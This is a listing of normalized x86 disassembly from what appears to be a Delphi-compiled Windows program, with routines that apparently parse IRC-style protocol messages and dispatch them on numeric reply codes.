lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
retn
sub_46c1cc
push ebx
mov ebx eax
cmp [ ebx + 0x10c ] 0x4
je r-xdata
mov edx [ ebx + 0x2e8 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b038
xor edx edx
mov eax ebx
call sub_46c814
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp dl 0x1
jne r-xdata
mov eax [ ebx + 0x2ec ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
pop ebx
retn
mov eax ebx
call sub_466df0
mov dl 0x1
mov eax ebx
call sub_46c814
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46c248
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c2f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_404204
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c2fe
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
retn
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0xc ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x1ac ]
call [ ebx + 0x1a8 ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
jmp r-xdata
sub_46c310
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c391
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46c248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c398
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
retn
sub_46c3b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
call sub_4043a8
mov eax [ ebp + 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c44c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46c310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c453
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp + 0x8 ]
call sub_403ef8
retn
sub_46c46c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c53d
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x2
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x20 ]
mov eax ebx
call sub_46c248
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
lea edx [ ebp - 0x1c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46c248
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c544
lea eax [ ebp - 0x20 ]
call sub_403ef8
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f1c
retn
sub_46c576
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax esi
mov edx [ ebx + 0xe8 ]
call sub_403f4c
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x110 ]
call sub_403f4c
pop esi
pop ebx
retn
sub_46c5ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c640
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46c248
mov eax [ ebx + 0xe8 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c647
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea eax [ ebx + 0xe8 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
jmp r-xdata
sub_46c65c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c6b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xec ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c6b7
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebx + 0xec ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
sub_46c6bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c710
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xf0 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c717
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebx + 0xf0 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
sub_46c71c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c770
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xf4 ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c777
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebx + 0xf4 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
sub_46c77c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46c7d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xfc ]
mov edx [ ebp - 0x4 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c7d7
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
lea eax [ ebx + 0xfc ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
sub_46c7dc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
cmp al [ ebx + 0x100 ]
je r-xdata
mov al [ esp ]
mov [ ebx + 0x100 ] al
sub_46c840
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_46cb1f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x2d0 ]
call sub_403ef8
lea eax [ ebx + 0x2d4 ]
call sub_403ef8
lea eax [ ebx + 0x2d8 ]
call sub_403ef8
lea eax [ ebx + 0x2dc ]
call sub_403ef8
mov eax [ ebx + 0x2cc ]
call sub_4041b8
test eax eax
jle r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebx + 0x2cc ]
cmp [ eax ] 0x3a
jne r-xdata
mov eax [ ebx + 0x2cc ]
call sub_4041b8
test eax eax
jg r-xdata
mov edx [ ebx + 0x2cc ]
mov eax r-xdata
call sub_4044fc
mov esi eax
lea eax [ ebx + 0x2d4 ]
push eax
mov ecx esi
sub ecx 0x2
mov edx 0x2
mov eax [ ebx + 0x2cc ]
call sub_404418
lea eax [ ebx + 0x2cc ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x200
mov eax [ ebx + 0x2cc ]
call sub_404418
mov ecx [ ebx + 0x2d4 ]
xor edx edx
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx [ ebx + 0x2d4 ]
mov eax r-xdata
call sub_4044fc
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebx + 0x2cc ]
call sub_4041b8
test eax eax
jle r-xdata
mov esi [ ebp - 0x4 ]
xor eax eax
mov al [ rw-data ]
dec eax
sub eax esi
jl r-xdata
mov edx [ ebx + 0x2cc ]
mov eax r-xdata
call sub_4044fc
mov esi eax
lea eax [ ebx + 0x2d8 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebx + 0x2cc ]
call sub_404418
lea eax [ ebx + 0x2cc ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x200
mov eax [ ebx + 0x2cc ]
call sub_404418
mov ecx [ ebx + 0x2d8 ]
mov edx 0x1
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
lea eax [ ebx + 0x2dc ]
mov edx [ ebx + 0x2cc ]
call sub_403f4c
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebx + 0x2d0 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebx + 0x2d4 ]
call sub_404418
lea eax [ ebx + 0x2d4 ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x200
mov eax [ ebx + 0x2d4 ]
call sub_404418
jmp r-xdata
mov edx [ ebx + 0x2cc ]
mov eax r-xdata
call sub_4044fc
mov esi eax
test esi esi
jle r-xdata
mov eax [ ebx + 0x2cc ]
cmp [ eax ] 0x3a
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cb26
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f1c
retn
inc eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x200
mov edx 0x1
mov eax [ ebx + 0x2cc ]
call sub_404418
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
lea eax [ ebx + 0x2cc ]
call sub_403ef8
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebx + 0x2cc ]
call sub_404418
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
lea eax [ ebx + 0x2cc ]
push eax
lea edx [ esi + 0x1 ]
mov ecx 0x200
mov eax [ ebx + 0x2cc ]
call sub_404418
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x2cc ]
call sub_4041b8
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebx + 0x2cc ]
call sub_404418
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
lea eax [ ebx + 0x2cc ]
call sub_403ef8
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
inc [ ebp - 0x4 ]
sub_46cb48
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
or esi 0xffffffff
jmp r-xdata
test esi esi
jge r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
cmp ebx 0xc
jle r-xdata
mov eax [ edi + 0x2d8 ]
mov edx [ ebx * 4 + rw-data ]
call sub_404304
jne r-xdata
inc ebx
mov esi ebx
sub_46cb7c
push ebp
mov ebp esp
mov ecx 0x64
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46c840
mov ecx [ ebx + 0x2d4 ]
mov edx [ ebx + 0x2d0 ]
mov eax [ ebx + 0x2e4 ]
call sub_46af88
mov [ ebp - 0x10 ] eax
cmp [ ebx + 0x1da ] 0x0
je r-xdata
or edx 0xffffffff
mov eax [ ebx + 0x2d8 ]
call sub_40800c
mov esi eax
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ ebx + 0x2d8 ]
push eax
mov eax [ ebx + 0x2dc ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46cb48
mov esi eax
cmp esi 0xffffffff
jle r-xdata
mov eax esi
cmp eax 0x143
jg r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b038
jmp r-xdata
cmp [ ebx + 0x242 ] 0x0
je r-xdata
cmp esi 0xc
ja r-xdata
cmp eax 0x171
jg r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x324 ]
mov edx 0x63
call sub_403f1c
lea eax [ ebp - 0x18c ]
call sub_403ef8
lea eax [ ebp - 0x198 ]
mov edx 0x3
call sub_403f1c
lea eax [ ebp - 0x188 ]
mov edx 0x2c
call sub_403f1c
lea eax [ ebp - 0xc0 ]
mov edx 0x6
call sub_403f1c
lea eax [ ebp - 0x80 ]
mov edx 0x12
call sub_403f1c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f1c
retn
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2e4 ]
call sub_46b038
mov eax [ ebx + 0x2d8 ]
push eax
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp [ esi * 4 + r-xdata ]
cmp eax 0x187
jg r-xdata
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp eax 0x12e
jg r-xdata
cmp eax 0x18b
jg r-xdata
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
add eax 0xfffffebc
cmp eax 0x2c
ja r-xdata
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x150 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x150 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
add eax 0xfffffed1
cmp eax 0x13
ja r-xdata
je r-xdata
add eax 0xfffffe6f
sub eax 0x66
jb r-xdata
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
add eax 0xfffffe8d
cmp eax 0xb
ja r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x214 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x218 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x218 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x210 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x242 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_46cd85 ]
mov eax [ ebx + 0x2c4 ]
push eax
push 0x1
mov ecx [ ebx + 0x2c0 ]
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
mov eax [ ebx + 0x2c0 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor eax eax
mov [ ebx + 0x2c4 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_46cd0f ]
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp eax 0xdd
jg r-xdata
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
sub eax 0x6f
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
sub eax 0x188
je r-xdata
lea ecx [ ebp - 0x244 ]
xor edx edx
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x244 ]
lea edx [ ebp - 0x240 ]
call sub_407b44
mov eax [ ebp - 0x240 ]
push eax
lea ecx [ ebp - 0x24c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x24c ]
lea edx [ ebp - 0x248 ]
call sub_407b44
mov edx [ ebp - 0x248 ]
pop eax
call sub_404304
jne r-xdata
jmp [ eax * 4 + jump_table_46ce5b ]
mov eax [ ebx + 0x2d8 ]
push eax
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx + 0x2c8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
sub esi 0x5
jl r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
lea ecx [ ebp - 0x164 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x164 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ecx [ ebp - 0x16c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x16c ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x232 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
lea ecx [ ebp - 0x1e8 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x1e8 ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
mov [ ebx + 0x101 ] 0x0
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov [ ebx + 0x101 ] 0x1
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x64 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x64 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp eax 0x105
jg r-xdata
je r-xdata
cmp esi 0x1af
jl r-xdata
mov eax [ ebx + 0x2d8 ]
push eax
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1ac ]
call [ ebx + 0x1a8 ]
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x274 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x274 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
dec eax
je r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x25c ]
push eax
lea ecx [ ebp - 0x260 ]
xor edx edx
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x260 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x264 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x264 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x25c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x250 ]
push eax
lea ecx [ ebp - 0x254 ]
xor edx edx
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x254 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x258 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x258 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x250 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
mov dl 0x4
mov eax ebx
call sub_46c814
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x8 ] 0x5
push esi
mov eax [ ebx + 0x2d8 ]
push eax
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_46b28c
cmp [ ebx + 0x282 ] 0x0
je r-xdata
cmp [ ebx + 0x182 ] 0x0
je r-xdata
lea ecx [ ebp - 0x170 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x170 ]
mov eax [ ebp - 0xc ]
call sub_46b28c
lea ecx [ ebp - 0x17c ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x180 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x180 ]
mov edx ebx
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x184 ]
push eax
lea ecx [ ebp - 0x188 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x188 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x20 ]
xor ecx ecx
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x184 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x18c ]
push eax
lea ecx [ ebp - 0x190 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x190 ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] 0xb
lea ecx [ ebp - 0x194 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x194 ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xcc ] 0xb
lea ecx [ ebp - 0x198 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x198 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xc4 ] 0xb
lea edx [ ebp - 0xd8 ]
mov ecx 0x2
mov eax r-xdata
